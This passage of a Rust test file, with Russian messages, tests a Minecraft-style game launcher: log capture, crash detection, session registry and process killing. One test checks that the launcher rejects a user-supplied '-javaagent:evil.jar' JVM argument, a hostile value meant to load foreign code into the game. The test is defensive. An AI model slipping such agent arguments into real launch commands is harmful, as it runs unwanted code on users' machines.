            .expect("поток чтения не должен завершиться паникой");
        (last_output, window_opened)
    }

    fn reader_lines(log: &Mutex<VecDeque<String>>) -> Vec<String> {
        log.lock()
            .unwrap_or_else(|e| e.into_inner())
            .iter()
            .cloned()
            .collect()
    }

    #[test]
    fn reader_survives_cp1251_line_between_valid_lines() {
        let mut bytes = b"Line one\n".to_vec();
        bytes.extend_from_slice(CP1251_CYRILLIC);
        bytes.extend_from_slice(b"\nLine three\n");

        let (last_output, _) = run_reader(bytes);
        let lines = reader_lines(&last_output);

        assert_eq!(
            lines.len(),
            3,
            "все три строки должны быть прочитаны: {lines:?}"
        );
        assert_eq!(lines[0], "Line one");
        assert!(
            lines[1].contains('\u{FFFD}'),
            "cp1251-кириллица конвертируется lossy: {:?}",
            lines[1]
        );
        assert_eq!(lines[2], "Line three");
    }

    #[test]
    fn reader_captures_final_line_without_trailing_newline() {
        let mut bytes = CP1251_CYRILLIC.to_vec();
        bytes.extend_from_slice(b"\nno trailing newline");

        let (last_output, _) = run_reader(bytes);
        let lines = reader_lines(&last_output);

        assert_eq!(lines.len(), 2, "строки: {lines:?}");
        assert_eq!(lines[1], "no trailing newline");
    }

    #[test]
    fn reader_drains_long_non_utf8_stream_to_the_end() {
        let total_lines = 5000;
        let mut bytes = Vec::new();
        for i in 0..total_lines {
            bytes.extend_from_slice(format!("garbage-{i}-").as_bytes());
            if i % 2 == 0 {
                bytes.extend_from_slice(CP1251_CYRILLIC);
            }
            bytes.push(b'\n');
        }
        bytes.extend_from_slice(b"OpenAL initialized\n");

        let (last_output, window_opened) = run_reader(bytes);
        let lines = reader_lines(&last_output);

        assert!(
            window_opened.load(AtomicOrdering::Relaxed),
            "маркер окна после мусора должен быть обнаружен"
        );
        assert_eq!(
            lines.len(),
            super::OUTPUT_TAIL_LIMIT,
            "хвост должен заполниться целиком: {}",
            lines.len()
        );
        assert_eq!(lines.last().map(String::as_str), Some("OpenAL initialized"));
    }
}

#[cfg(test)]
mod process_helpers_tests {
    use super::*;
    use std::io::Cursor;

    fn process_with_output(lines: &[&str]) -> GameProcess {
        GameProcess {
            window_opened: Arc::new(AtomicBool::new(false)),
            exited: Arc::new(AtomicBool::new(false)),
            exit_status: Arc::new(StdMutex::new(None)),
            last_output: Arc::new(StdMutex::new(
                lines
                    .iter()
                    .map(|line| line.to_string())
                    .collect::<VecDeque<String>>(),
            )),
        }
    }

    #[test]
    fn finalize_jvm_args_puts_agent_first_and_attach_flag_last() {
        let args = finalize_jvm_args(
            vec!["-Xmx1G".to_string()],
            Some("-javaagent:authlib-injector.jar=https://server".to_string()),
            false,
        )
        .expect("валидные аргументы");
        assert_eq!(
            args,
            vec![
                "-javaagent:authlib-injector.jar=https://server".to_string(),
                "-Xmx1G".to_string()
            ]
        );

        let args =
            finalize_jvm_args(vec!["-Xmx1G".to_string()], None, true).expect("валидные аргументы");
        assert_eq!(
            args,
            vec![
                "-Xmx1G".to_string(),
                "-XX:+DisableAttachMechanism".to_string()
            ],
            "disable-attach добавляется последним"
        );
    }

    #[test]
    fn finalize_jvm_args_rejects_forbidden_user_agent() {
        let error = finalize_jvm_args(
            vec!["-Xmx1G".to_string(), "-javaagent:evil.jar".to_string()],
            None,
            true,
        )
        .expect_err("пользовательский агент должен отклоняться");
        assert!(
            error.to_string().contains("-javaagent:evil.jar"),
            "ошибка должна называть аргумент: {error}"
        );
    }

    #[test]
    fn exit_reason_detects_out_of_memory_only() {
        let process = process_with_output(&[
            "Starting game",
            "java.lang.OutOfMemoryError: Java heap space",
        ]);
        let reason = exit_reason(&process.last_output);
        assert!(reason.is_some_and(|text| text.contains(OUT_OF_MEMORY_MARKER)));

        let clean = process_with_output(&["Starting game", "Sound engine started"]);
        assert!(exit_reason(&clean.last_output).is_none());
    }

    #[test]
    fn track_output_keeps_tail_limit_and_truncates_long_lines() {
        let log = Arc::new(StdMutex::new(VecDeque::new()));
        for i in 0..25 {
            track_output(&log, &format!("line {i}"));
        }
        track_output(&log, &"x".repeat(400));

        let log = log.lock().unwrap_or_else(|e| e.into_inner());
        assert_eq!(log.len(), OUTPUT_TAIL_LIMIT, "буфер ограничен хвостом");
        assert_eq!(
            log.front().map(String::as_str),
            Some("line 6"),
            "самые старые строки вытесняются"
        );
        assert_eq!(
            log.back().map(String::as_str),
            Some("x".repeat(300).as_str()),
            "длинные строки обрезаются до 300 символов"
        );
    }

    #[test]
    fn output_tail_returns_last_five_lines() {
        let process = process_with_output(&["1", "2", "3", "4", "5", "6", "7"]);

        let tail = process.output_tail();

        assert_eq!(tail, "3\n4\n5\n6\n7");
    }

    #[test]
    fn window_markers_and_flags_reflect_game_state() {
        assert!(is_window_open_marker("LWJGL Version: 3.3.1"));
        assert!(is_window_open_marker("Sound engine started"));
        assert!(!is_window_open_marker("Random game log line"));

        let process = process_with_output(&[]);
        assert!(!process.has_exited());
        assert!(!process.window_opened());
    }

    #[tokio::test]
    async fn wait_for_window_ok_when_window_opens_and_err_when_game_dies() {
        let opened = process_with_output(&[]);
        opened.window_opened.store(true, AtomicOrdering::Relaxed);
        opened
            .wait_for_window(Duration::from_millis(100))
            .await
            .expect("открытое окно — успех");

        let dead = process_with_output(&["last log line before crash"]);
        dead.exited.store(true, AtomicOrdering::Relaxed);
        *dead.exit_status.lock().unwrap_or_else(|e| e.into_inner()) =
            Some("exit code 1".to_string());

        let error = dead
            .wait_for_window(Duration::from_secs(2))
            .await
            .expect_err("выход до окна должен дать ошибку");
        let text = error.to_string();
        assert!(
            text.contains("Игра завершилась до открытия окна (exit code 1)"),
            "ошибка должна содержать статус: {text}"
        );
        assert!(
            text.contains("last log line before crash"),
            "ошибка должна содержать хвост лога: {text}"
        );
    }

    #[test]
    fn output_reader_tracks_lines_and_detects_window() {
        let last_output = Arc::new(StdMutex::new(VecDeque::new()));
        let window_opened = Arc::new(AtomicBool::new(false));

        let handle = spawn_output_reader(
            Cursor::new(b"LWJGL Version: 3.3\nplain line\n\xff\xfe binary\n".to_vec()),
            Arc::clone(&last_output),
            Arc::clone(&window_opened),
            false,
            "Steve".to_string(),
        );
        handle.join().expect("ридер не должен паниковать");

        assert!(
            window_opened.load(AtomicOrdering::Relaxed),
            "маркер окна открывает флаг"
        );
        let log = last_output.lock().unwrap_or_else(|e| e.into_inner());
        assert_eq!(
            log.len(),
            3,
            "все строки, включая не-UTF-8 (lossy), попадают в буфер"
        );
    }

    #[tokio::test]
    async fn find_authlib_jar_detects_fixed_name() {
        let guard = crate::test_support::TempDir::new("authlib_jar");

        assert!(find_authlib_jar(&guard.0).is_none(), "без jar — None");

        std::fs::write(guard.0.join("authlib-injector.jar"), b"jar").unwrap();
        assert_eq!(
            find_authlib_jar(&guard.0),
            Some(guard.0.join("authlib-injector.jar"))
        );
    }
}

#[cfg(test)]
mod kill_process_tests {
    use super::{
        aggregated_kill_error, ensure_session_free, game_running, game_usernames, kill_and_reap,
        kill_game_process, mark_game_finalized, register_game_session, remove_game_session,
        GAME_SESSIONS,
    };
    use crate::utils::errors::LauncherError;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::{Arc, Mutex as StdMutex};
    use std::time::Duration;

    static KILL_TEST_LOCK: StdMutex<()> = StdMutex::new(());

    fn reset_registry() {
        GAME_SESSIONS
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .clear();
    }

    fn lock_child(
        child: &Arc<StdMutex<std::process::Child>>,
    ) -> std::sync::MutexGuard<'_, std::process::Child> {
        child.lock().unwrap_or_else(|e| e.into_inner())
    }

    #[cfg(unix)]
    fn spawn_helper() -> std::process::Child {
        std::process::Command::new("sleep")
            .arg("30")
            .spawn()
            .expect("запуск тестового процесса")
    }

    #[cfg(target_os = "linux")]
    fn process_state(pid: u32) -> Option<char> {
        std::fs::read_to_string(format!("/proc/{pid}/stat"))
            .ok()
            .and_then(|stat| {
                let after_comm = stat.rsplit(')').next()?;
                after_comm.split_whitespace().next()?.chars().next()
            })
    }

    #[test]
    fn aggregated_kill_error_reports_every_failure() {
        assert!(aggregated_kill_error(&[]).is_ok());

        let error = aggregated_kill_error(&[
            "PID 10: не удалось завершить: boom".to_string(),
            "PID 11: не удалось получить статус процесса игры: gone".to_string(),
        ])
        .expect_err("при неудачах завершения должна возвращаться агрегированная ошибка");

        let text = error.to_string();
        assert!(
            text.contains("Не удалось завершить процесс игры"),
            "ошибка должна объяснять общий сбой: {text}"
        );
        assert!(text.contains("PID 10"), "первая неудача: {text}");
        assert!(
            text.contains("PID 11"),
            "вторая неудача не потеряна: {text}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn kill_and_reap_terminates_child_without_zombie() {
        let mut child = spawn_helper();
        let pid = child.id();

        kill_and_reap(&mut child);

        assert!(
            child.try_wait().is_ok(),
            "опрос переапанного процесса не должен давать ошибок"
        );
        #[cfg(target_os = "linux")]
        assert!(
            process_state(pid).is_none(),
            "после kill+wait процесс не должен оставаться в таблице процессов как зомби (pid {pid})"
        );
    }

    #[test]
    fn kill_reports_missing_game() {
        let _guard = KILL_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        reset_registry();

        let error =
            kill_game_process().expect_err("без зарегистрированного процесса должна быть ошибка");

        assert!(
            error.to_string().contains("Игра не запущена"),
            "ошибка должна называть причину: {error}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn session_free_guard_is_per_account() {
        let _guard = KILL_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        reset_registry();

        ensure_session_free("Steve").expect("без сессий запуск разрешён любому аккаунту");

        let first = register_game_session(spawn_helper(), "Steve").expect("регистрация");
        assert!(game_running());

        let error = ensure_session_free("Steve")
            .expect_err("повторный запуск того же аккаунта отклоняется");
        assert!(
            matches!(
                error.downcast_ref::<LauncherError>(),
                Some(LauncherError::GameProcess(_))
            ),
            "ожидается GameProcess: {error}"
        );
        assert!(
            error.to_string().contains("с аккаунта Steve"),
            "ошибка должна называть аккаунт: {error}"
        );

        ensure_session_free("Alex").expect("другой аккаунт запускается параллельно");

        let exited = AtomicBool::new(false);
        mark_game_finalized(&exited, &first);
        assert!(exited.load(Ordering::Relaxed));
        assert!(!game_running());
        ensure_session_free("Steve").expect("после выхода сессия аккаунта снова свободна");

        let _ = lock_child(&first).kill();
    }

    #[cfg(unix)]
    #[test]
    fn usernames_list_all_registered_sessions() {
        let _guard = KILL_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        reset_registry();

        let first = register_game_session(spawn_helper(), "Steve").expect("регистрация Steve");
        let second = register_game_session(spawn_helper(), "Alex").expect("регистрация Alex");

        assert_eq!(
            game_usernames(),
            vec!["Steve".to_string(), "Alex".to_string()]
        );

        remove_game_session(&first);
        assert_eq!(
            game_usernames(),
            vec!["Alex".to_string()],
            "выход первой игры не трогает вторую"
        );
        assert!(game_running(), "реестр держит вторую сессию");

        remove_game_session(&second);
        assert!(game_usernames().is_empty());
        assert!(!game_running());

        let _ = lock_child(&first).kill();
        let _ = lock_child(&second).kill();
    }

    #[cfg(unix)]
    #[test]
    fn registry_removal_only_accepts_own_handle() {
        let _guard = KILL_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        reset_registry();

        let registered =
            register_game_session(spawn_helper(), "Steve").expect("первая регистрация");
        let foreign = Arc::new(StdMutex::new(spawn_helper()));

        remove_game_session(&foreign);
        assert!(game_running(), "чужой хендл не должен очищать реестр");

        remove_game_session(&registered);
        assert!(!game_running(), "свой хендл очищает реестр");

        let _ = lock_child(&registered).kill();
        let _ = lock_child(&foreign).kill();
    }

    #[cfg(unix)]
    #[test]
    fn same_username_registration_returns_orphan_for_cleanup() {
        let _guard = KILL_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        reset_registry();

        let first = register_game_session(spawn_helper(), "Steve").expect("первая регистрация");

        let mut orphan = register_game_session(spawn_helper(), "Steve")
            .expect_err("второй процесс того же аккаунта должен отклоняться");
        let _ = orphan.kill();
        let _ = orphan.wait();

        let second =
            register_game_session(spawn_helper(), "Alex").expect("другой аккаунт регистрируется");

        assert_eq!(game_usernames().len(), 2, "реестр держит обе сессии");

        let _ = lock_child(&first).kill();
        let _ = lock_child(&second).kill();
    }

    #[cfg(unix)]
    #[test]
    fn kill_terminates_all_registered_processes() {
        let _guard = KILL_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        reset_registry();

        let first = Arc::new(StdMutex::new(spawn_helper()));
        let second = Arc::new(StdMutex::new(spawn_helper()));
        {
            let mut registry = GAME_SESSIONS.lock().unwrap_or_else(|e| e.into_inner());
            registry.push(super::RegisteredGame {
                child: Arc::clone(&first),
                username: "Steve".to_string(),
            });
            registry.push(super::RegisteredGame {
                child: Arc::clone(&second),
                username: "Alex".to_string(),
            });
        }

        kill_game_process().expect("принудительное завершение должно срабатывать");

        for child in [&first, &second] {
            let mut exited = false;
            for _ in 0..50 {
                let status = lock_child(child)
                    .try_wait()
                    .expect("опрос статуса процесса");
                if status.is_some() {
                    exited = true;
                    break;
                }
                std::thread::sleep(Duration::from_millis(100));
            }
            assert!(exited, "оба процесса должны завершиться после kill");
        }
        assert!(game_running(), "реестр очищают wait-потоки, а не сам kill");

        reset_registry();
    }

    #[cfg(unix)]
    #[test]
    fn kill_continues_past_already_exited_session() {
        let _guard = KILL_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        reset_registry();

        let exited = register_game_session(
            std::process::Command::new("sleep")
                .arg("0")
                .spawn()
                .expect("запуск короткоживущего процесса"),
            "Steve",
        )
        .expect("регистрация завершившейся сессии");
        lock_child(&exited)
            .wait()
            .expect("естественный выход первой игры");

        let live = Arc::new(StdMutex::new(spawn_helper()));
        {
            let mut registry = GAME_SESSIONS.lock().unwrap_or_else(|e| e.into_inner());
            registry.push(super::RegisteredGame {
                child: Arc::clone(&live),
                username: "Alex".to_string(),
            });
        }

        kill_game_process()
            .expect("уже завершившаяся сессия не должна прерывать завершение остальных сессий");

        let mut gone = false;
        for _ in 0..50 {
            if lock_child(&live)
                .try_wait()
                .expect("опрос статуса процесса")
                .is_some()
            {
                gone = true;
                break;
            }
            std::thread::sleep(Duration::from_millis(100));
        }
        assert!(
            gone,
            "живая сессия после уже завершившейся должна быть завершена"
        );

        remove_game_session(&exited);
        remove_game_session(&live);
    }

    #[cfg(unix)]
    #[test]
    fn kill_after_natural_exit_is_not_an_error() {
        let _guard = KILL_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        reset_registry();

        let shared = register_game_session(
            std::process::Command::new("sleep")
                .arg("0")
                .spawn()
                .expect("запуск короткоживущего процесса"),
            "Steve",
        )
        .expect("регистрация");

        let status = lock_child(&shared)
            .wait()
            .expect("естественный выход процесса");
        assert!(status.success());

        kill_game_process().expect(
            "kill по уже завершившейся игре не должен давать ошибку и не должен бить по чужому процессу",
        );

        remove_game_session(&shared);
    }
}
